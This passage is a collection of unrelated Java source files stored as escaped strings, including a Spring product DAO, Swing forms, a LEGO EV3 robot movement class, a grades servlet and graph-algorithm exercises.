null){\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\ttemp++;\r\n\t\t\t\t\t\tstrings.add(saveLesson + \" \" + saveTeacher);\r\n\t\t\t\t\t\tsaveLesson= LessonsBr.readLine();\r\n\t\t\t\t\t\t\r\n\t\t\t\t    \r\n\t\t\t\t\t\r\n\t\t\t\t\t\t//strings.add(saveLesson);\r\n\t\t\t\t\t\r\n\t\t\t\t    \r\n\t\t\t\t}\r\n\t\t\t\t\tif(TeacherBr.readLine()==null)\r\n\t\t\t\t\tstrings.add(saveLesson);\r\n\t\t\t\t}\r\n\t\t\t} catch (IOException e) {\r\n\t\t\t\t// TODO Auto-generated catch block\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tint y=0;\r\n\t\t\tfor(String x: strings) {\r\n\t\t\t\t\r\n\t\t\t\t//System.out.println(moduleId);\r\n\t\t\t\t\t\t\r\n\t\t\t\t\tStringTokenizer stn=new StringTokenizer(x);\r\n\t\t\t\t\t\r\n\t\t\t\t\tint moduleId=Integer.parseInt(stn.nextToken());\r\n\t\t\t\t\tString moduleName=stn.nextToken();\r\n\t\t\t\t\tString groupName1=stn.nextToken();\r\n\t\t\t\t\tint grouId1=controlGroup(groupName1);\r\n\t\t\t\t\tString groupName2=stn.nextToken();\r\n\t\t\t\t\tint grouId2=controlGroup(groupName2",
    "package electronicStore.dao;\n\nimport java.util.List;\n\nimport javax.transaction.Transactional;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.orm.hibernate5.HibernateTemplate;\nimport org.springframework.stereotype.Component;\n\nimport electronicStore.model.Product;\n\n@Component\npublic class ProductDao {\n\t@Autowired\n\tprivate HibernateTemplate hibernateTemplate;\n\n\t//create product\n\t@Transactional\n\tpublic void createProduct(Product product) {\n\t\tthis.hibernateTemplate.saveOrUpdate(product);\n\t}\n\n\t// get Single product\n\tpublic Product getSingleProduct(int pid) {\n\t\tProduct p = this.hibernateTemplate.get(Product.class, pid);\n\t\treturn p;\n\t}\n\n\t//Get all product\n\tpublic List<Product> getProducts() {\n\t\tList<Product> products = this.hibernateTemplate.loadAll(Product.class);\n\t\treturn products;\n\t}\n\n\t// delete single product\n\t@Transactional\n\tpublic void deleteProduct(int pid) {\n\t\tProduct p = this.hibernateTemplate.load(Product.class, pid);\n\t\tthis.hibernateTemplate .delete(p);\n\n\t}\n\n}\n",
    "public class MatricesIdentidad {\n    public static void main(String[] args) {\n        // Declaraci\u00f3n de una matriz de 5x5\n        int[][] matriz = new int[5][5];\n\n        // Asignaci\u00f3n de valores: 1 a la diagonal principal y 0 al resto\n        for (int i = 0; i < matriz.length; i++) {\n            for (int j = 0; j < matriz[0].length; j++) {\n                if (i == j) {\n                    matriz[i][j] = 1;\n                }\n            }\n        }\n\n        // Imprimo la matriz Identidad:\n        MatrizSimetrica.imprimirMatriz(matriz);\n\n        // Asignaci\u00f3n de valores: 1 a la fila inferior, 1 a la fila superior, 1 a la diagonal principal y 0 al resto\n        for (int i = 0; i < matriz.length; i++) {\n            for (int j = 0; j < matriz[0].length; j++) {\n                if (i == 0 || i == matriz.length - 1) {\n                    matriz[i][j] = 1;\n                }\n                if (i == j) {\n                    matriz[i][j] = 1;\n                }\n            }\n        }\n\n        // Imprimo la matriz que tiene limites y diagonal principal con 1:\n        MatrizSimetrica.imprimirMatriz(matriz);\n\n        // Asignaci\u00f3n de valores: 1 a la fila inferior, 1 a la fila superior, 1 a la columna 0 y a la ultima columna, 1 a la diagonal principal y 0 al resto\n        for (int i = 0; i < matriz.length; i++) {\n            for (int j = 0; j < matriz[0].length; j++) {\n                if (i == 0 || i == matriz.length - 1) {\n                    matriz[i][j] = 1;\n                }\n                if (j == 0 || j == matriz[0].length - 1) {\n                    matriz[i][j] = 1;\n                }\n                if (i == j) {\n                    matriz[i][j] = 1;\n                }\n            }\n        }\n\n        // Imprimo la matriz que tiene limites y diagonal principal con 1:\n        MatrizSimetrica.imprimirMatriz(matriz);\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\n\npackage presentation.BackOffice.Vues;\n\nimport Metier.MetierGestion.GestionnaireLabo;\nimport Metier.MetierPOJO.Laboratoire;\nimport presentation.BackOffice.Controlleur.ControlleurLaboratoire;\n\nimport java.util.ArrayList;\nimport javax.swing.JOptionPane;\nimport javax.swing.JTable;\nimport javax.swing.table.DefaultTableModel;\n\n/**\n *\n * @author MERYEM\n */\npublic class ModificationLaboratoire extends javax.swing.JFrame {\n    GestionnaireLabo gestLabo = new GestionnaireLabo();\n    Laboratoire labo = new Laboratoire();\n    DefaultTableModel model;\n\n    /** Creates new form ModificationLaboratoire */\n    public ModificationLaboratoire(ControlleurLaboratoire c) {\n        initComponents();\n       // Table(TableLabo);\n       this.controlleurlaboratoire = c;\n        Table1();\n    }\n\n    /** This method is called from within the constructor to\n     * initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is\n     * always regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jPanel2 = new javax.swing.JPanel();\n        jLabel2 = new javax.swing.JLabel();\n        IdLabo = new javax.swing.JTextField();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        TableLabo = new javax.swing.JTable();\n        jLabel3 = new javax.swing.JLabel();\n        NomLabo = new javax.swing.JTextField();\n        jLabel4 = new javax.swing.JLabel();\n        EmailLabo = new javax.swing.JTextField();\n        jLabel5 = new javax.swing.JLabel();\n        RespoLabo = new javax.swing.JTextField();\n        Modifier = new javax.swing.JButton();\n        Exit = new javax.swing.JButton();\n        jLabel7 = new javax.swing.JLabel();\n        jLabel8 = new javax.swing.JLabel();\n        jLabel6 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(0, 51, 51));\n\n        jLabel1.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 36)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(255, 153, 153));\n        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource(\"/presentation/img/bouton-modifier.png\"))); // NOI18N\n        jLabel1.setText(\"    MODIFIER LABORATOIRE\");\n\n        jPanel2.setBackground(new java.awt.Color(0, 51, 51));\n        jPanel2.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(102, 0, 51)));\n\n        jLabel2.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 24)); // NOI18N\n        jLabel2.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel2.setText(\"ENTREZ L'ID DE LABO A MODIFIER\");\n\n        IdLabo.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                IdLaboActionPerformed(evt);\n            }\n        });\n\n        TableLabo.setModel(new javax.swing.table.DefaultTableModel(\n            new Object [][] {\n\n            },\n            new String [] {\n                \"Id Laboratoire\", \"nom Laboratoire\", \"Responsable Laboratoire\", \"Email Labo\"\n            }\n        ));\n        jScrollPane1.setViewportView(TableLabo);\n\n        jLabel3.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        jLabel3.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel3.setText(\"Nom\");\n\n        jLabel4.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        jLabel4.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel4.setText(\"Email\");\n\n        EmailLabo.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                EmailLaboActionPerformed(evt);\n            }\n        });\n\n        jLabel5.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        jLabel5.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel5.setText(\"Responsable\");\n\n        Modifier.setBackground(new java.awt.Color(255, 102, 102));\n        Modifier.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        Modifier.setText(\"Modifier\");\n        Modifier.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                ModifierActionPerformed(evt);\n            }\n        });\n\n        Exit.setBackground(new java.awt.Color(255, 102, 102));\n        Exit.setFont(new java.awt.Font(\"Tw Cen MT Condensed\", 1, 18)); // NOI18N\n        Exit.setText(\"Quitter\");\n        Exit.addActionListener(new java.awt.event.ActionListener() {\n ",
    "package Lab5;\r\n\r\nimport lejos.hardware.lcd.LCD;\r\nimport lejos.hardware.motor.EV3LargeRegulatedMotor;\r\nimport lejos.hardware.port.MotorPort;\r\nimport lejos.hardware.port.SensorPort;\r\nimport lejos.hardware.sensor.EV3GyroSensor;\r\nimport lejos.hardware.sensor.EV3UltrasonicSensor;\r\nimport lejos.robotics.SampleProvider;\r\nimport lejos.utility.Delay;\r\n\r\npublic class Movement {\r\n\r\n\tprivate final float CALIBRATION_DIST = 0.15f;\r\n\tprivate final float COLOR_IDENTIFICATION_RANGE = 0.04f;\r\n\tfinal float TILE_LENGTH = 0.35f;\r\n\tfinal int ROBOT_ROTATION_RIGHT = -90; \r\n\tfinal int ROBOT_ROTATION_LEFT = 90;\r\n\r\n\tprivate EV3GyroSensor gyroSensor = new EV3GyroSensor(SensorPort.S3);\r\n\r\n\tprivate SampleProvider angle = gyroSensor.getAngleMode(); \r\n\tprivate float angleSample[] = new float[angle.sampleSize()]; \r\n\r\n\tprivate EV3LargeRegulatedMotor rightMotor = new EV3LargeRegulatedMotor(\r\n\t\t\tMotorPort.C);\r\n\tprivate EV3LargeRegulatedMotor leftMotor = new EV3LargeRegulatedMotor(\r\n\t\t\tMotorPort.B);\r\n\r\n\tEV3UltrasonicSensor distanceSensor = new EV3UltrasonicSensor(SensorPort.S4);\r\n\r\n\tSampleProvider distance = distanceSensor.getDistanceMode();\r\n\r\n\tfloat distanceSample[] = new float[distance.sampleSize()];\r\n\r\n\tpublic void calibration() {\r\n\t\tdistance.fetchSample(distanceSample, 0);\r\n\t\tif (distanceSample[0] < TILE_LENGTH)\r\n\r\n\t\t{\r\n\t\t\tDelay.msDelay(150);\r\n\t\t\tif (distanceSample[0] < CALIBRATION_DIST) {\r\n\r\n\t\t\t\tmoveBackward();\r\n\t\t\t\twhile (distanceSample[0] <= CALIBRATION_DIST) {\r\n\t\t\t\t\tdistance.fetchSample(distanceSample, 0);\r\n\r\n\t\t\t\t}\r\n\t\t\t\tstop();\r\n\t\t\t} else {\r\n\t\t\t\t{\r\n\t\t\t\t\tmoveForward();\r\n\t\t\t\t\twhile (distanceSample[0] >= CALIBRATION_DIST) {\r\n\t\t\t\t\t\tdistance.fetchSample(distanceSample, 0);\r\n\r\n\t\t\t\t\t}\r\n\t\t\t\t\tstop();\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t}\r\n\r\n\tpublic void turn(int degrees) {\r\n\r\n\t\tfinal int ANGLE_LOCATION_ROW = 2;\r\n\t\tfinal int ANGLE_LOACTION_COLUMN = 1;\r\n\r\n\t\tangleSample[0] = 0;\r\n\t\tgyroSensor.reset();\r\n\t\tDelay.msDelay(150);\r\n\r\n\t\twhile (Math.abs(angleSample[0]) < Math.abs(degrees)) {\r\n\r\n\t\t\tangle.fetchSample(angleSample, 0);\r\n\r\n\t\t\tint varyingSpeed = (int) (10 * (Math.abs(degrees) - Math\r\n\t\t\t\t\t.abs(angleSample[0])));\r\n\t\t\trightMotor.setSpeed(varyingSpeed);\r\n\t\t\tleftMotor.setSpeed(varyingSpeed);\r\n\r\n\t\t\tif (degrees > 0) {\r\n\r\n\t\t\t\trightMotor.backward();\r\n\t\t\t\tleftMotor.forward();\r\n\t\t\t\t\r\n\t\t\t\t//Delay.msDelay(110);\r\n\r\n\t\t\t\t//stop();\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tif (degrees < 0) {\r\n\r\n\t\t\t\trightMotor.forward();\r\n\t\t\t\tleftMotor.backward();\r\n\t\t\t\t\r\n\t\t\t\t//Delay.msDelay(110);\r\n\r\n\t\t\t\t//stop();\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tangle.fetchSample(angleSample, 0);\r\n\r\n\t\t\tLCD.drawString(\"Angle \" + angleSample[0], ANGLE_LOACTION_COLUMN,\r\n\t\t\t\t\tANGLE_LOCATION_ROW);\r\n\r\n\t\t}\r\n\r\n\t\tstop();\r\n\t\t\r\n\t\tcalibration();\r\n\r\n\t\t// gyroSensor.close();\r\n\r\n\t}\r\n\r\n\tpublic void moveForward35cm() {\r\n\r\n\t\tint speed = 200;\r\n\t\tfinal int DEGREES = -2188; // motor should be rotated 2188 degrees so\r\n\t\t\t\t\t\t\t\t\t// the robot can move 35cm (a tile).\r\n\t\tDelay.msDelay(150);\r\n\t\trightMotor.setSpeed(speed);\r\n\t\tleftMotor.setSpeed(speed);\r\n\t\trightMotor.rotate(DEGREES, true);\r\n\t\tleftMotor.rotate(DEGREES, false);\r\n\t\tcalibration();\r\n\t}\r\n\r\n\tpublic void moveBackward() {\r\n\t\tDelay.msDelay(150);\r\n\t\trightMotor.setSpeed(200);\r\n\t\tleftMotor.setSpeed(200);\r\n\t\trightMotor.forward();\r\n\t\tleftMotor.forward();\r\n\r\n\t}\r\n\r\n\tpublic void moveForward() {\r\n\t\tDelay.msDelay(150);\r\n\t\trightMotor.setSpeed(200);\r\n\t\tleftMotor.setSpeed(200);\r\n\t\trightMotor.backward();\r\n\t\tleftMotor.backward();\r\n\t}\r\n\r\n\tpublic void stop() {\r\n\t\trightMotor.stop(true);\r\n\t\tleftMotor.stop(false);\r\n\t}\r\n\r\n\tpublic void initialCalibration() {\r\n\t\tboolean frontNotCalibrated = true;\r\n\t\tboolean rightNotCalibrated = true;\r\n\r\n\t\tdistance.fetchSample(distanceSample, 0);\r\n\t\tif (distanceSample[0] < TILE_LENGTH) {\r\n\t\t\tcalibration();\r\n\t\t\tfrontNotCalibrated = false;\r\n\t\t}\r\n\t\tturn(ROBOT_ROTATION_RIGHT);\r\n\r\n\t\tdistance.fetchSample(distanceSample, 0);\r\n\t\tif (distanceSample[0] < TILE_LENGTH) {\r\n\t\t\tcalibration();\r\n\t\t\trightNotCalibrated = false;\r\n\t\t}\r\n\r\n\t\tturn(ROBOT_ROTATION_RIGHT);\r\n\r\n\t\tif (frontNotCalibrated) {\r\n\t\t\tcalibration();\r\n\t\t}\r\n\t\tturn(ROBOT_ROTATION_RIGHT);\r\n\r\n\t\tif (rightNotCalibrated) {\r\n\t\t\tcalibration();\r\n\t\t}\r\n\r\n\t\tturn(ROBOT_ROTATION_RIGHT);\r\n\t}\r\n\r\n\tpublic void moveToDetectColor() {\r\n\r\n\t\tdistance.fetchSample(distanceSample, 0);\r\n\r\n\t\tmoveForward();\r\n\t\twhile (distanceSample[0] >= COLOR_IDENTIFICATION_RANGE) {\r\n\t\t\tdistance.fetchSample(distanceSample, 0);\r\n\t\t}\r\n\r\n\t\tstop();\r\n\t}\r\n\r\n}\r\n",
    "package com.emergentes.controlador;\n\nimport com.emergentes.modelo.calificaciones;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.ArrayList;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(name = \"MainServlet\", urlPatterns = {\"/MainServlet\"})\npublic class MainServlet extends HttpServlet {\n\n \n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n       String op = request.getParameter(\"op\");\n       calificaciones objper = new calificaciones();\n       int id, pos;\n       \n       HttpSession ses = request.getSession();\n       ArrayList<calificaciones> lista = (ArrayList<calificaciones>)ses.getAttribute(\"listacal\");\n       \n       switch (op){\n           case \"nuevo\":\n               request.setAttribute(\"mical\",objper);\n               request.getRequestDispatcher(\"editar.jsp\").forward(request, response);\n               break;\n           case \"editar\":\n               id = Integer.parseInt(request.getParameter(\"id\"));\n               pos = buscarPorIndice(request, id);\n               objper = lista.get(pos);\n               request.setAttribute(\"mical\",objper);\n               request.getRequestDispatcher(\"editar.jsp\").forward(request, response);\n               break;\n           case \"eliminar\":\n               id = Integer.parseInt(request.getParameter(\"id\"));\n               pos = buscarPorIndice(request, id);\n               if (pos >= 0){\n                   lista.remove(pos);\n               }\n               request.setAttribute(\"listacal\", lista);\n               response.sendRedirect(\"index.jsp\");\n               break;\n           default:\n       }\n       \n    }\n\n    @Override\n   protected void doPost(HttpServletRequest request, HttpServletResponse response)\n        throws ServletException, IOException {\n    int id = Integer.parseInt(request.getParameter(\"id\"));\n    HttpSession ses = request.getSession();\n    ArrayList<calificaciones> lista = (ArrayList<calificaciones>)ses.getAttribute(\"listacal\");\n    calificaciones objper = new calificaciones();\n    objper.setId(id);\n    objper.setNombre(request.getParameter(\"nombre\"));\n    objper.setP1(Integer.parseInt(request.getParameter(\"p1\")));\n    objper.setP2(Integer.parseInt(request.getParameter(\"p2\")));\n    objper.setEf(Integer.parseInt(request.getParameter(\"ef\")));\n    \n    // Calcular la suma de las calificaciones y establecerla en el objeto calificaciones\n    int nota = objper.getP1() + objper.getP2() + objper.getEf();\n    objper.setNota(nota);\n   // obtencion de Datos \n    if (id == 0){\n        int idNuevo = obtenerId(request);\n        objper.setId(idNuevo);\n        lista.add(objper);\n    } else {\n        int pos = buscarPorIndice(request, id);\n        lista.set(pos, objper);\n    }\n    \n    request.setAttribute(\"listacal\", lista);\n    response.sendRedirect(\"index.jsp\");\n}\n\n    public int buscarPorIndice(HttpServletRequest request,int id){\n    HttpSession ses = request.getSession();\n    ArrayList<calificaciones> lista = (ArrayList<calificaciones>) ses.getAttribute(\"listacal\");\n    \n    int pos = -1;\n    \n    if (lista != null){\n      for(calificaciones ele : lista){\n         ++pos;\n         if (ele.getId() == id){\n         break;\n         \n        }\n    }\n}\n    return pos;\n    \n        }\n    \n    public int obtenerId(HttpServletRequest request){\n    HttpSession ses = request.getSession();\n    ArrayList<calificaciones> lista = (ArrayList<calificaciones>) ses.getAttribute(\"listacal\");\n    int idn = 0;\n    for (calificaciones ele : lista){\n        idn = ele.getId();\n    }\n    return idn + 1;\n    }\n\n}\n",
    "package model;\r\n\r\nimport java.io.Serializable;\r\n\r\n/**\r\n *\r\n * @author Matheus Felipe\r\n */\r\n\r\n/**\r\n * Representa uma pessoa f\u00edsica.\r\n */\r\npublic class PessoaFisica extends Pessoa implements Serializable {\r\n    \r\n    /**\r\n     * definir o serialVersionUID para o mesmo valor em todas as classes\r\n     * serializ\u00e1veis que podem ser gravadas em arquivos e recuperadas\r\n     * posteriormente. Isso garante compatibilidade entre diferentes vers\u00f5es do\r\n     * seu programa.\r\n     */\r\n    private static final long serialVersionUID = 123456789L;\r\n    private String cpf;\r\n    private int idade;\r\n\r\n    // Construtor completo\r\n    public PessoaFisica(int id, String nome, String cpf, int idade) {\r\n        super(id, nome); // Chama o construtor da classe Pai (Pessoa)\r\n        this.cpf = cpf;\r\n        this.idade = idade;\r\n    }\r\n\r\n    // Getters e Setters para os atributos espec\u00edficos de PessoaFisica\r\n    public String getCpf() {\r\n        return cpf;\r\n    }\r\n\r\n    public void setCpf(String cpf) {\r\n        this.cpf = cpf;\r\n    }\r\n\r\n    public int getIdade() {\r\n        return idade;\r\n    }\r\n\r\n    public void setIdade(int idade) {\r\n        this.idade = idade;\r\n    }\r\n\r\n    // Sobrescreve o m\u00e9todo exibir para incluir os dados espec\u00edficos de PessoaFisica\r\n    @Override\r\n    public void exibir() {\r\n        super.exibir(); // Chama o m\u00e9todo exibir da classe Pai (Pessoa)\r\n        System.out.println(\"CPF: \" + cpf);\r\n        System.out.println(\"Idade: \" + idade);\r\n    }\r\n}\r\n",
    "package views;\r\n\r\nimport javax.swing.*;\r\nimport controllers.SupplierController;\r\nimport java.awt.*;\r\n\r\npublic class SupplierView extends JPanel {\r\n    private JTextField txtSupplierID = new JTextField(10);\r\n    private JTextField txtName = new JTextField(20);\r\n    private JTextField txtContactName = new JTextField(20);\r\n    private JTextField txtEmail = new JTextField(20);\r\n    private JTextField txtPhone = new JTextField(20);\r\n    private JTextField txtAddress = new JTextField(20);\r\n    private JButton btnFindSupplier = new JButton(\"Find Supplier by ID\");\r\n    private JButton btnAddUpdateSupplier = new JButton(\"Add/Update Supplier\");\r\n    private JButton btnDeleteSupplier = new JButton(\"Delete Supplier\");\r\n    private JButton btnBack = new JButton(\"Back\");\r\n\r\n    private SupplierController controller;\r\n\r\n    public SupplierView() {\r\n        this.controller = new SupplierController(this);\r\n\r\n        CardLayout cardLayout = MainView.getCardLayout();\r\n        JPanel rightPanel = MainView.getRightPanel();\r\n\r\n        setLayout(new GridBagLayout());\r\n        GridBagConstraints gbc = new GridBagConstraints();\r\n        gbc.gridwidth = GridBagConstraints.REMAINDER;\r\n        gbc.fill = GridBagConstraints.HORIZONTAL;\r\n        gbc.insets = new Insets(4, 4, 4, 4); \r\n\r\n        setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10)); \r\n\r\n        addFormField(\"Supplier ID:\", txtSupplierID, gbc);\r\n        addFormField(\"Name:\", txtName, gbc);\r\n        addFormField(\"Contact Name:\", txtContactName, gbc);\r\n        addFormField(\"Email:\", txtEmail, gbc);\r\n        addFormField(\"Phone:\", txtPhone, gbc);\r\n        addFormField(\"Address:\", txtAddress, gbc);\r\n\r\n        \r\n        gbc.insets = new Insets(15, 4, 4, 4); \r\n\r\n        \r\n        gbc.fill = GridBagConstraints.NONE;\r\n        gbc.anchor = GridBagConstraints.CENTER;\r\n        add(btnFindSupplier, gbc);\r\n        gbc.insets = new Insets(8, 4, 4, 4); \r\n        add(btnAddUpdateSupplier, gbc);\r\n        add(btnDeleteSupplier, gbc);\r\n\r\n        \r\n        JPanel spacer = new JPanel();\r\n        spacer.setOpaque(false);\r\n        gbc.weightx = 1.0;\r\n        gbc.fill = GridBagConstraints.HORIZONTAL;\r\n        add(spacer, gbc); \r\n\r\n        \r\n        gbc.weightx = 0.0; \r\n        gbc.fill = GridBagConstraints.NONE;\r\n        gbc.anchor = GridBagConstraints.LINE_END; \r\n        add(btnBack, gbc);\r\n\r\n        btnFindSupplier.addActionListener(e -> controller.findSupplierByID());\r\n        btnAddUpdateSupplier.addActionListener(e -> controller.addOrUpdateSupplier());\r\n        btnDeleteSupplier.addActionListener(e -> controller.deleteSupplier());\r\n        btnBack.addActionListener(e -> cardLayout.show(rightPanel, \"ButtonPanel\"));\r\n    }\r\n\r\n    private void addFormField(String label, JTextField textField, GridBagConstraints gbc) {\r\n        add(new JLabel(label), gbc);\r\n        add(textField, gbc);\r\n    }\r\n\r\n    \r\n    public JTextField getTxtSupplierID() { return txtSupplierID; }\r\n    public JTextField getTxtName() { return txtName; }\r\n    public JTextField getTxtContactName() { return txtContactName; }\r\n    public JTextField getTxtEmail() { return txtEmail; }\r\n    public JTextField getTxtPhone() { return txtPhone; }\r\n    public JTextField getTxtAddress() { return txtAddress; }\r\n}\r\n",
    "package programa_Vehiculos;\n\nimport java.util.Scanner;\n\npublic class ImplVehiculo {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tString marca, modelo;\n\t\tint precio, numVehiculos,indicePrecioVehiculoMasBarato;\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\t//se establece la cantidad de objetos a crear en el array\n\t\tSystem.out.println(\"Ingrese la cantidad de vehiculos: \");\n\t\tnumVehiculos = sc.nextInt();\n\t\tVehiculo vehiculoArray[] = new Vehiculo[numVehiculos];\n\t\t\n\t\t//se obtiene la informacion para guardar en el array\n\t\tfor (int i=0; i<vehiculoArray.length; i++) {\n\t\t\tsc.nextLine();\n\t\t\tSystem.out.println(\"Ingrese las caracteristicas del vehiculo\"+(i+1)+\":\");\n\t\t\tSystem.out.println(\"Ingrese la Marca del vehiculo\");\n\t\t\tmarca = sc.nextLine();\n\t\t\tSystem.out.println(\"Ingrese el Modelo del vehiculo\");\n\t\t\tmodelo = sc.nextLine();\n\t\t\tSystem.out.println(\"Ingrese el Precio del vehiculo\");\n\t\t\tprecio = sc.nextInt();\n\t\t\tsc.close();\n\n\t\t\t//guardamos los parametros en el array\n\t\t\tvehiculoArray[i] = new Vehiculo(marca, modelo, precio);\n\t\t\t\n\t\t}//fin del ciclo for\n\t\t\n\t\t//mostrar por pantalla la instancia con las caracteristicas requeridas\n\t\tindicePrecioVehiculoMasBarato = indicePrecioVehiculoMasBarato(vehiculoArray);\n\t\tSystem.out.println(\"El vehiculo m\u00e1s barato es: \");\n\t\tSystem.out.println(vehiculoArray[indicePrecioVehiculoMasBarato].mostrarDatosVehiculo());\n\t\t\n\t}//fin del main\n\t\n\t//metodo estatico que retorna el indice del vehiculo mas barato.\n\t\n\tpublic static int indicePrecioVehiculoMasBarato(Vehiculo vehiculo[]) {\n\t\tint precio;\n\t\tint indice = 0;\n\t\t\n\t\tprecio = vehiculo[0].obtenerPrecio();\n\t\t\n\t\tfor (int i = 1; i<vehiculo.length; i++) {\n\t\t\tprecio = vehiculo[i].obtenerPrecio();\n\t\t\tindice = i;\t\n\t\t}\n\t\treturn indice; //retorna el vehiculo mas barato \n\t}\n\t\n}\n",
    "import java.util.*;\r\n\r\npublic class Hard {\r\n    static class  Pair implements Comparable<Pair>{\r\n        int vertex;\r\n        int distance;\r\n        Pair(int curr_vertex,int its_distance){\r\n            this.vertex=curr_vertex;\r\n            this.distance=its_distance;\r\n        }\r\n        public int compareTo(Pair p2){\r\n            return this.distance-p2.distance;\r\n        }\r\n    }\r\n    static class Edge{\r\n        int src;\r\n        int des;\r\n        int weight;\r\n         Edge(int src,int des,int weight){\r\n            this.src=src;\r\n            this.des=des;\r\n            this.weight=weight;\r\n        }\r\n    }\r\n    public List<String>  findItinerary(List<List<String>> tickets){\r\n        ArrayList<String> ticket=new ArrayList<>();\r\n        HashMap<String,String> details=new HashMap<>();\r\n        String start=\"\";\r\n\r\n        for (List<String> tic:tickets){\r\n            details.put(tic.get(0),tic.get(1));\r\n        }\r\n        HashMap<String,String> rev_tic=new HashMap<>();\r\n\r\n        for (Map.Entry<String,String> chithi:details.entrySet()){\r\n            rev_tic.put(chithi.getValue(),chithi.getKey());\r\n        }\r\n\r\n\r\n        for (String w:\r\n             details.keySet()) {\r\n            if(!rev_tic.containsKey(w)){\r\n                ticket.add(w);\r\n//                System.out.print(w+\"->\");\r\n                start=w;\r\n            }\r\n        }\r\n        while (!details.isEmpty()){\r\n            ticket.add(details.get(start));\r\n            String temp=start;\r\n            start=details.get(start);\r\n            details.remove(temp);\r\n        }\r\n\r\n        return ticket;\r\n\r\n    }\r\n    public static int solve(int lenght_rod,int[] sizes){\r\n        if(lenght_rod==0){\r\n            return 0;\r\n        }\r\n        if(lenght_rod<0){\r\n            return -1;\r\n        }\r\n        int min=Integer.MAX_VALUE;\r\n        for(int i=0;i<sizes.length;i++){\r\n            int min_for_that_size=solve(lenght_rod-sizes[i],sizes);\r\n            if (min_for_that_size>=0) {\r\n                min = Math.min(min, min_for_that_size);\r\n            }\r\n        }\r\n        return min+1;\r\n    }\r\n    public static int minCost(int n, int[] cuts) {\r\n        return solve(n,cuts);\r\n    }\r\n    public static int Devide_chocolate_1231(ArrayList<Integer> a, int n, int m){\r\n        Collections.sort(a);\r\n        if(m>n){\r\n            return -1;\r\n        }\r\n        int ans=Integer.MAX_VALUE;\r\n        int maxi=m-1;\r\n        int min=0;\r\n        while(maxi<n){\r\n            int curr_min=a.get(maxi)- a.get(min);\r\n            ans=Math.min(curr_min,ans);\r\n            maxi++;\r\n            min++;\r\n        }\r\n\r\n        return ans;\r\n    }\r\n    public  void dfs(ArrayList<ArrayList<Integer>> graphs,int current,boolean[] visit){\r\n        visit[current]=true;\r\n        count++;\r\n        for (int i=0;i<graphs.get(current).size();i++){\r\n            int curr=graphs.get(current).get(i);\r\n            if (!visit[curr]){\r\n                dfs(graphs,curr,visit);\r\n            }\r\n        }\r\n    }\r\n    public  void topoSorting_dfs(int[] edges,int current,boolean[] visisted,Stack<Integer> st)  {\r\n        visisted[current]=true;\r\n        int child=edges[current];\r\n        if (child!=-1 && !visisted[child]){\r\n            topoSorting_dfs(edges,child,visisted,st);\r\n        }\r\n        st.push(current);\r\n    }\r\n    static int count;\r\n    public int longestCycle_2360(int[] edges) {\r\n        int len=edges.length;\r\n        boolean[] visited=new boolean[len];\r\n        Stack<Integer> st=new Stack<>();\r\n        for (int i=0;i<len;i++){\r\n            if (!visited[i]){\r\n                topoSorting_dfs(edges,i,visited,st);\r\n            }\r\n        }\r\n        Arrays.fill(visited,false);\r\n\r\n        ArrayList<ArrayList<Integer>> revereseArr=new ArrayList<>();\r\n        for (int i=0;i<len;i++){\r\n            revereseArr.add(new ArrayList<>());\r\n        }\r\n\r\n        for (int i=0;i<len;i++){\r\n            int des=edges[i];\r\n            if(des!=-1){\r\n                revereseArr.get(des).add(i);\r\n            }\r\n        }\r\n\r\n        int maxCycle=0;\r\n        while (!st.isEmpty()){\r\n            int curr_node=st.pop();\r\n            if(!visited[curr_node]){\r\n                visited[curr_node]=true;\r\n                count=0;\r\n                dfs(revereseArr,curr_node,visited);\r\n                